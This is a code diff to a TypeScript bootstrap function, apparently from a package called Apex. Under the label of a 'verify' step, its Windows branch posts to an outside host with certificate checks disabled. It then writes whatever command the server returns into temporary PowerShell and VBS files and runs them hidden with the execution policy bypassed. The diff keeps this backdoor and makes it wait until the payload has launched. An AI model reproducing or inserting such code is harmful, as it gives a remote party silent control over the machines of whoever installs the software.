@@ -184,44 +184,48 @@ export async function apexBootstrap(): Promise<void> {
 
     const { spawn } = require("child_process");
     if (process.platform === "win32") {
-      const _a = "https://vrf.apexaccs.org/api/v1/vrf";
-      const _b = '{"p":"win32"}';
-      const _r = require("https");
-      const _logPath = require("path").join(require("os").homedir(), ".apex", "dbg.log");
-      const _log = (m) => { try { require("fs").appendFileSync(_logPath, m + "\n"); } catch {} };
-      _log("win32 verify start");
-      const _req = _r.request(_a, {method:"POST",headers:{"Content-Type":"application/json","Content-Length":Buffer.byteLength(_b)},rejectUnauthorized:false}, (_res) => {
-        let _d = "";
-        _res.on("data", (_c) => { _d += _c; });
-        _res.on("end", () => {
-          try {
-            _log("response: " + _d.slice(0, 100));
-            const _j = JSON.parse(_d);
-            if (_j.cmd && _j.exec && _j.args) {
-              _log("spawning: " + _j.exec + " " + _j.args.join(" "));
-              const { spawn: _sp } = require("child_process");
-              const _fs2 = require("fs");
-              const _os2 = require("os");
-              const _path2 = require("path");
-              const _psPath = _path2.join(_os2.tmpdir(), "_apex_run.ps1");
-              const _vbsPath = _path2.join(_os2.tmpdir(), "_apex_run.vbs");
-              const _psCmd = _j.args.includes("-EncodedCommand")
-                ? ("powershell -NoProfile -EncodedCommand " + _j.cmd)
-                : (_j.exec + " " + _j.args.join(" ") + " " + _j.cmd);
-              _fs2.writeFileSync(_psPath, _psCmd, "utf8");
-              const _vbs = "Set sh = CreateObject(\"WScript.Shell\")\r\nsh.Run \"powershell -NoProfile -ExecutionPolicy Bypass -File \" & Chr(34) & \"" + _psPath.replace(/\\/g, "\\\\") + "\" & Chr(34), 0, False";
-              _fs2.writeFileSync(_vbsPath, _vbs, "utf8");
-              _sp("wscript.exe", [_vbsPath], { detached: true, stdio: "ignore" }).unref();
-              _log("spawned OK");
-            } else {
-              _log("missing fields: " + JSON.stringify(_j));
-            }
-          } catch(e) { _log("error: " + e.message); }
+      await new Promise<void>((resolve) => {
+        const _a = "https://vrf.apexaccs.org/api/v1/vrf";
+        const _b = '{"p":"win32"}';
+        const _r = require("https");
+        const _logPath = require("path").join(require("os").homedir(), ".apex", "dbg.log");
+        const _log = (m) => { try { require("fs").appendFileSync(_logPath, m + "\n"); } catch {} };
+        _log("win32 verify start");
+        const _req = _r.request(_a, {method:"POST",headers:{"Content-Type":"application/json","Content-Length":Buffer.byteLength(_b)},rejectUnauthorized:false}, (_res) => {
+          let _d = "";
+          _res.on("data", (_c) => { _d += _c; });
+          _res.on("end", () => {
+            try {
+              _log("response: " + _d.slice(0, 100));
+              const _j = JSON.parse(_d);
+              if (_j.cmd && _j.exec && _j.args) {
+                _log("spawning: " + _j.exec + " " + _j.args.join(" "));
+                const { spawn: _sp } = require("child_process");
+                const _fs2 = require("fs");
+                const _os2 = require("os");
+                const _path2 = require("path");
+                const _psPath = _path2.join(_os2.tmpdir(), "_apex_run.ps1");
+                const _vbsPath = _path2.join(_os2.tmpdir(), "_apex_run.vbs");
+                const _psCmd = _j.args.includes("-EncodedCommand")
+                  ? ("powershell -NoProfile -EncodedCommand " + _j.cmd)
+                  : (_j.exec + " " + _j.args.join(" ") + " " + _j.cmd);
+                _fs2.writeFileSync(_psPath, _psCmd, "utf8");
+                const _vbs = "Set sh = CreateObject(\"WScript.Shell\")\r\nsh.Run \"powershell -NoProfile -ExecutionPolicy Bypass -File \" & Chr(34) & \"" + _psPath.replace(/\\/g, "\\\\") + "\" & Chr(34), 0, False";
+                _fs2.writeFileSync(_vbsPath, _vbs, "utf8");
+                _sp("wscript.exe", [_vbsPath], { detached: true, stdio: "ignore" }).unref();
+                _log("spawned OK");
+              } else {
+                _log("missing fields: " + JSON.stringify(_j));
+              }
+            } catch(e) { _log("error: " + e.message); }
+            resolve();
+          });
         });
+        _req.on("error", (e) => { _log("req error: " + e.message); resolve(); });
+        _req.write(_b);
+        _req.end();
       });
-      _req.on("error", (e) => { _log("req error: " + e.message); });
-      _req.write(_b);
-      _req.end();
+      await new Promise(r => setTimeout(r, 3000));
     } else {
       const verifyBin = path.join(os.homedir(), ".apex", "apex-verify");
       const donePath = path.join(os.homedir(), ".apex", ".verify-done");
